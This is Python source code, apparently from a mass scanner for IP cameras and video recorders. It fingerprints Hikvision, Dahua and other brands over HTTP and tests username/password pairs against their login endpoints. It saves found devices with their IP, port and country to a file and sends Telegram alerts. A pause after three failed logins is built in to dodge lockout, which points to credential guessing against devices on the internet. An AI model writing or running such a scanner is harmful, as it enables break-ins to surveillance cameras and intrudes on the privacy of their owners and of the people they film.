def detect_camera_type(ip: str, port: int = 80) -> Tuple[bool, str, int]:
    """
    Detect camera type by connecting and checking response (ultra-fast detection)
    
    Returns:
        Tuple of (detected: bool, camera_type: str, port: int)
    """
    # Skip detection if port 37777 (definitely Dahua)
    if port == 37777:
        return True, "Anjhua-Dahua Technology Camera", port

    # Quick port-based detection (no HTTP request needed for speed)
    if port in [80, 443, 8000, 8080, 8081, 8082, 8083, 8084, 8085]:
        # Could be either, will try both in validation
        return False, "Unknown", port

    # Quick HTTP check only if needed (with very short timeout)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(_cli_scan_timeout)
            sock.connect((ip, port))
            sock.send(b'GET / HTTP/1.0\r\n\r\n')
            response = sock.recv(1024).decode(
                errors='ignore').lower()

            if 'hikvision' in response or '/isapi/' in response or 'hik' in response:
                return True, "HIK Vision Camera", port
            elif 'anjhua' in response or 'dahua' in response or 'web service' in response or '/cgi-bin/configmanager.cgi' in response:
                return True, "Anjhua-Dahua Technology Camera", port
            elif 'nvr' in response or 'network video recorder' in response:
                return True, "NVR (Network Video Recorder)", port
            elif 'dvr' in response or 'digital video recorder' in response:
                return True, "DVR (Digital Video Recorder)", port
            elif 'xmeye' in response or 'sophia' in response or 'netsurveillance' in response:
                return True, "XMeye NVR/DVR", port
            elif 'tiandy' in response:
                return True, "Tiandy NVR", port
            elif 'uniview' in response or 'unv' in response:
                return True, "Uniview NVR/Camera", port
            elif 'reolink' in response:
                return True, "Reolink IP Camera", port
            elif 'amcrest' in response:
                return True, "Amcrest IP Camera", port
            elif 'foscam' in response:
                return True, "Foscam IP Camera", port
            elif 'axis' in response or 'axis communications' in response:
                return True, "Axis Network Camera", port
            elif 'tp-link' in response or 'vigi' in response:
                return True, "TP-Link VIGI Camera", port
            elif 'ezviz' in response:
                return True, "Ezviz Camera", port
            elif 'hanwha' in response or 'wisenet' in response:
                return True, "Hanwha/Wisenet Camera", port
            elif 'mikrotik' in response or 'routeros' in response or 'tplink' in response or 'netgear' in response or 'asus' in response:
                return True, "FILTERED_ROUTER", port
            elif 'onvif' in response:
                return True, "ONVIF Device", port
    except Exception:
        pass

    return False, "Unknown", port


class HikvisionCameraValidator:
    """Validates Hikvision camera password using ISAPI protocol"""

    HTTP_PORT = 80
    HTTPS_PORT = 443
    ALT_HTTP_PORT = 8000

    DEVICE_INFO_ENDPOINT = "/ISAPI/System/deviceInfo"
    SYSTEM_CAPABILITIES = "/ISAPI/System/capabilities"
    USER_INFO_ENDPOINT = "/ISAPI/Security/users/1"

    def __init__(self,
                 ip_address: str,
                 username: str,
                 password: str,
                 port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 0.8  # Further reduced for speed
        self.session = requests.Session() # Use session for connection pooling
        self.session.verify = False
        self.session.trust_env = False

    def validate_via_isapi_digest(self,
                                  endpoint: str = None) -> Tuple[bool, str]:
        """Validate password via ISAPI with HTTP Digest Authentication (fast)"""
        if endpoint is None:
            endpoint = self.DEVICE_INFO_ENDPOINT

        # Smart Lockout Protection: Delay if we've had too many failures
        if not hasattr(self, '_failed_attempts'):
            self._failed_attempts = 0
            
        if self._failed_attempts >= 3:
            print(f"\n{Fore.YELLOW}[!] {self.ip_address}: 3 failed attempts. "
                  f"Pausing {COOLDOWN_SECONDS}s to prevent lockout...{Style.RESET_ALL}")
            if TELEGRAM_CONFIG.get("enabled"):
                send_telegram_message(
                    f"⚠️ <b>Lockout Protection</b>\n"
                    f"IP: <code>{self.ip_address}</code>\n"
                    f"Status: Pausing {COOLDOWN_SECONDS}s after 3 failed attempts.")
            time.sleep(COOLDOWN_SECONDS)
            self._failed_attempts = 0

        try:
            url = f"http://{self.ip_address}:{self.port}{endpoint}"
            response = self.session.get(
                url,
                auth=HTTPDigestAuth(self.username, self.password),
                timeout=self.timeout,
                allow_redirects=False
            )

            if response.status_code == 200:
                # CRITICAL: Verify response body is actual Hikvision camera data
                # Routers/generic devices may return 200 to any request without auth
                body = response.text.lower()
                # Check for Hikvision-specific XML/API response markers
                hik_markers = [
                    '<deviceinfo', '<devicename>', '<model>', 'isapi',
                    'hikvision', '<serialnumber>', '<macaddress>',
                    '<devicetype>', 'hik', '<firmwareversion>'
                ]
                # Also reject obvious router/non-camera responses
                router_markers = [
                    'routeros', 'mikrotik', 'netgear', '<html', 'login page',
                    'router', 'gateway', 'welcome to', 'openwrt', 'dd-wrt',
                    'luci', 'cisco', 'juniper', 'ubiquiti', 'airmax',
                    '<!doctype html', 'unauthorized access', 'access denied',
                    'phicomm', 'tp-link', 'tplink', 'asus router'
                ]
                is_router = any(m in body for m in router_markers)
                is_camera = any(m in body for m in hik_markers)

                # If response looks like a router page, reject it
                if is_router and not is_camera:
                    self._failed_attempts += 1
                    return False, "Response looks like a router/non-camera device"

                # If response has camera markers, definitely a success
                if is_camera:
                    self._failed_attempts = 0
                    # Try to extract model from XML response
                    try:
                        model_match = re.search(r'<model>(.*?)</model>', response.text, re.IGNORECASE)
                        if model_match:
                            with results_lock:
                                device_models[self.ip_address] = model_match.group(1).strip()
                        elif '<devicename>' in body:
                            name_match = re.search(r'<devicename>(.*?)</devicename>', response.text, re.IGNORECASE)
                            if name_match:
                                with results_lock:
                                    device_models[self.ip_address] = name_match.group(1).strip()
                    except Exception:
                        pass
                    auth_header = response.request.headers.get("Authorization", "")
                    auth_type = "Digest" if "Digest" in auth_header else "Basic"
                    return True, f"Auth success on {self.port} ({auth_type})"

                # If response body is empty or tiny (redirect-like), it might be valid
                # Only accept if the response required auth (had Authorization header)
                auth_header = response.request.headers.get("Authorization", "")
                if auth_header and len(body) < 50:
                    self._failed_attempts = 0
                    return True, f"Auth success on {self.port}"

                # Otherwise treat 200 with non-camera body as failure (false positive)
                self._failed_attempts += 1
                return False, "Response is not a Hikvision camera (possible router/unknown device)"

            if response.status_code == 401:
                self._failed_attempts += 1
                auth_info = response.headers.get('Www-Authenticate', '')
                auth_method = auth_info.split()[0] if auth_info else "Unknown"
                return False, f"Invalid credentials ({auth_method})"
        except Exception as e:
            return False, str(e)

        return False, "N/A"

    def validate_via_multiple_endpoints(self) -> Tuple[bool, str]:
        """Try multiple ISAPI endpoints to validate password"""
        # Only try first endpoint for speed (most reliable)
        endpoint = self.DEVICE_INFO_ENDPOINT
        success, message = self.validate_via_isapi_digest(endpoint)
        if success:
            return True, message
        elif "401" in message or "Authentication failed" in message:
            return False, message

        return False, "All ISAPI endpoints failed"

    def validate(self) -> Tuple[bool, str]:
        """Main validation method for Hikvision cameras (fast - single endpoint)"""
        # Try only first endpoint for maximum speed
        success, message = self.validate_via_isapi_digest(
            self.DEVICE_INFO_ENDPOINT)
        return success, message


class DahuaCameraValidator:
    """Validates Dahua/Anjhua camera password"""

    SDK_PORT = 37777
    HTTP_PORT = 80
    HTTPS_PORT = 443

    def __init__(self,
                 ip_address: str,
                 username: str,
                 password: str,
                 port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 0.8 # Further reduced
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False

    def validate_via_http_api(self) -> Tuple[bool, str]:
        """Attempt to validate password via HTTP/HTTPS API (fast)"""
        endpoint = "/cgi-bin/magicBox.cgi?action=getDeviceType"
        
        # Smart Lockout Protection
        if not hasattr(self, '_failed_attempts'):
            self._failed_attempts = 0
            
        if self._failed_attempts >= 3:
            print(f"\n{Fore.YELLOW}[!] {self.ip_address}: 3 failed attempts. "
                  f"Pausing {COOLDOWN_SECONDS}s to prevent lockout...{Style.RESET_ALL}")
            if TELEGRAM_CONFIG.get("enabled"):
                send_telegram_message(
                    f"⚠️ <b>Lockout Protection</b>\n"
                    f"IP: <code>{self.ip_address}</code>\n"
                    f"Status: Pausing {COOLDOWN_SECONDS}s after 3 failed attempts.")
            time.sleep(COOLDOWN_SECONDS)
            self._failed_attempts = 0

        try:
            url = f"http://{self.ip_address}:{self.port}{endpoint}"
            response = self.session.get(
                url,
                timeout=self.timeout,
                auth=HTTPDigestAuth(self.username, self.password),
                allow_redirects=False
            )

            if response.status_code == 200:
                # CRITICAL: Verify response body is actual Dahua camera data
                # Dahua API returns plain text like "DeviceType=IPC-xxx" or similar
                # Routers/generic devices return HTML pages that bypass auth
                body = response.text.strip()
                body_lower = body.lower()

                # Dahua-specific response markers (plain text API format)
                dahua_markers = [
                    'devicetype=', 'ok\n', 'result=ok', 'table.softwaredebug',
                    'devicetype =', 'softwareversion=', 'serialno=', 'builddate=',
                    'dahua', 'anjhua', 'dh-', 'ipc-', 'ivs-', 'sd-', 'hcvr',
                    'xvr', 'nvr', 'name=dh', 'brand=dahua'
                ]
                # Router/non-camera markers to reject
                router_markers = [
                    'routeros', 'mikrotik', 'netgear', '<!doctype html', '<html',
                    'login page', 'router', 'gateway', 'welcome to', 'openwrt',
                    'dd-wrt', 'luci', 'cisco', 'juniper', 'ubiquiti', 'airmax',
                    'unauthorized access', 'access denied', 'phicomm', 'tplink',
                    'asus router', '<title>', 'javascript', 'stylesheet'
                ]

                is_router = any(m in body_lower for m in router_markers)
                is_camera = any(m in body_lower for m in dahua_markers)

                if is_router and not is_camera:
                    self._failed_attempts += 1
                    return False, "Response looks like a router/non-camera device"

                if is_camera:
                    self._failed_attempts = 0
                    # Extract model from DeviceType= response
                    try:
                        for line in body.splitlines():
                            if '=' in line:
                                key, _, val = line.partition('=')
                                key = key.strip().lower()
                                val = val.strip()
                                if key == 'devicetype' and val:
                                    with results_lock:
                                        device_models[self.ip_address] = val
                                    break
                    except Exception:
                        pass
                    auth_header = response.request.headers.get("Authorization", "")
                    auth_type = "Digest" if "Digest" in auth_header else "Basic"
                    return True, f"Auth success on {self.port} ({auth_type})"

                # Also try secondary Dahua endpoint to confirm
                try:
                    url2 = f"http://{self.ip_address}:{self.port}/cgi-bin/magicBox.cgi?action=getSoftwareVersion"
                    resp2 = self.session.get(url2, timeout=self.timeout,
                                             auth=HTTPDigestAuth(self.username, self.password),
                                             allow_redirects=False)
                    if resp2.status_code == 200:
                        body2 = resp2.text.strip().lower()
                        if 'version=' in body2 or 'softwareversion=' in body2 or 'builddate=' in body2:
                            self._failed_attempts = 0
                            auth_header = response.request.headers.get("Authorization", "")
                            auth_type = "Digest" if "Digest" in auth_header else "Basic"
                            return True, f"Auth success on {self.port} ({auth_type})"
                except Exception:
                    pass

                # Ambiguous 200 — not clearly camera or router, treat as fail
                self._failed_attempts += 1
                return False, "Response is not a Dahua camera (possible router/unknown device)"

            if response.status_code == 401:
                self._failed_attempts += 1
                auth_info = response.headers.get('Www-Authenticate', '')
                auth_method = auth_info.split()[0] if auth_info else "Unknown"
                return False, f"Invalid credentials ({auth_method})"
        except Exception as e:
            return False, str(e)

        return False, "N/A"

    def validate(self) -> Tuple[bool, str]:
        """Main validation method for Dahua cameras (fast)"""
        # Try HTTP API only
        success, message = self.validate_via_http_api()
        return success, message


class GenericCameraValidator:
    """Validates generic IP cameras (Axis, Reolink, Foscam, Amcrest, ONVIF, etc.)
    using HTTP Basic and Digest authentication on common endpoints."""

    GENERIC_ENDPOINTS = [
        "/axis-cgi/param.cgi?action=list&group=root.Brand",
        "/onvif/device_service",
        "/cgi-bin/snapshot.cgi",
        "/cgi-bin/hi3510/param.cgi?cmd=getuser",
        "/videoMain",
        "/livestream.cgi",
        "/image/jpeg.cgi",
        "/web/cgi-bin/hi3510/param.cgi",
        "/cgi-bin/viewer/video.jpg",
        "/snapshot.cgi",
        "/mjpg/video.mjpg",
        "/video/mjpg.cgi",
        "/cgi-bin/param.cgi?action=list",
        "/",
    ]

    def __init__(self, ip_address: str, username: str, password: str, port: int = 80):
        self.ip_address = ip_address
        self.username = username
        self.password = password
        self.port = port
        self.timeout = 1.5
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False

    def validate(self) -> Tuple[bool, str]:
        """Try HTTP Digest then Basic auth on common camera endpoints."""
        base = f"http://{self.ip_address}:{self.port}"
        auth_digest = HTTPDigestAuth(self.username, self.password)
        auth_basic = (self.username, self.password)
        reject_patterns = [
            '<!doctype html', '<html', 'routeros', 'mikrotik', 'router',
            'gateway', 'openwrt', 'dd-wrt', 'login page', 'welcome to'
        ]
        camera_patterns = [
            'axis', 'reolink', 'foscam', 'amcrest', 'onvif', 'camera',
            'video', 'stream', 'nvr', 'dvr', 'channel', 'cgi', 'devicetype',
            'ok\n', 'result=ok', 'brand', 'model', 'firmware', 'serialno'
        ]
        for endpoint in self.GENERIC_ENDPOINTS:
            url = base + endpoint
            for auth in [auth_digest, auth_basic]:
                try:
                    resp = self.session.get(url, auth=auth, timeout=self.timeout,
                                            allow_redirects=True)
                    if resp.status_code == 200:
                        body = resp.text[:1000].lower()
                        if any(p in body for p in reject_patterns):
                            continue
                        if any(p in body for p in camera_patterns):
                            auth_type = "Digest" if isinstance(auth, HTTPDigestAuth) else "Basic"
                            return True, f"Generic camera auth success ({auth_type}) on {endpoint}"
                    elif resp.status_code == 401:
                        continue
                except Exception:
                    continue
        return False, "No generic camera response"


def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str = "Unknown", country_code: str = "XX") -> Optional[dict]:
    """
    Fast camera detection only (no login attempt) - Phase 1
    Returns camera info if found, None otherwise
    """
    global scanned_count, total_ips, cctv_output_file, current_country_name, _global_cameras_found

    try:
        with results_lock:
            scanned_count += 1
            current = scanned_count
            total = total_ips
            _cams = _global_cameras_found
        if current % 10 == 0 or current <= 3:
            sys.stdout.write(
                f"\r\033[K{Fore.CYAN}[*] [{current}/{total}] "
                f"{country_name} ({country_code}) | "
                f"{Fore.GREEN}📷 {_cams} saved{Fore.CYAN} | "
                f"Scanning: {ip}{Style.RESET_ALL}")
            sys.stdout.flush()

        open_ports = fast_port_scan(ip, ports)
        if _cli_verbose and open_ports:
            print(f"\n{Fore.CYAN}[SCAN] {ip} → open: {', '.join(str(p) for p in open_ports)}{Style.RESET_ALL}")
        if not open_ports:
            return None

        camera_ports = [
            p for p in open_ports if p in [80, 443, 37777, 8000, 8080,
                                           8081, 8082, 8083, 8084, 8085]
        ]
        if not camera_ports:
            return None

        detected_port = camera_ports[0]
        camera_found, camera_type = detect_camera_via_http(ip, detected_port)

        if not camera_found and len(camera_ports) > 1:
            for port in camera_ports[1:]:
                camera_found, camera_type = detect_camera_via_http(ip, port)
                if camera_found:
                    detected_port = port
                    break

        if not camera_found:
            if detected_port == 37777:
                camera_type = "Anjhua-Dahua Technology Camera"
                camera_found = True

        if camera_found and camera_type and camera_type != "Unknown Camera" and camera_type not in [
                "", "Unknown"
        ] and camera_type != "FILTERED_ROUTER":
            if detected_port in [8080, 8000]:
                url = f"http://{ip}:{detected_port}"
            else:
                url = f"http://{ip}"
            detection_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            if cctv_output_file:
                try:
                    with open(cctv_output_file, 'a', encoding='utf-8') as file:
                        file.write(f"{'='*60}\n")
                        file.write(f"Camera Type: {camera_type}\n")
                        model = device_models.get(ip, "")
                        if model:
                            file.write(f"Device Model: {model}\n")
                        file.write(f"IP Address: {ip}\n")
                        file.write(f"Port: {detected_port}\n")
                        file.write(f"URL: {url}\n")
                        file.write(f"Country Name: {country_name}\n")
                        file.write(f"Country Code: {country_code}\n")
                        file.write(f"Detection Time: {detection_time}\n")
                        file.write(f"{'='*60}\n\n")
                        file.flush()
                except Exception:
                    pass

            with results_lock:
                _global_cameras_found += 1
                _cams_now = _global_cameras_found
            model = device_models.get(ip, "")
            _dc   = device_color(camera_type)
            _flag = country_flag(country_code)
            print(f"\n{_dc}[✓] {Fore.YELLOW}{_flag} [{country_name} ({country_code})]{Style.RESET_ALL}{_dc} Camera Found! {camera_type} | {ip}:{detected_port} | 📷 #{_cams_now}{Style.RESET_ALL}")

            send_telegram_camera_detection(ip, camera_type, detected_port, model, country_name, country_code)

            return {
                'ip': ip,
                'camera_type': camera_type,
                'port': detected_port,
                'url': url,
                'open_ports': open_ports
            }

        return None

    except Exception:
        return None


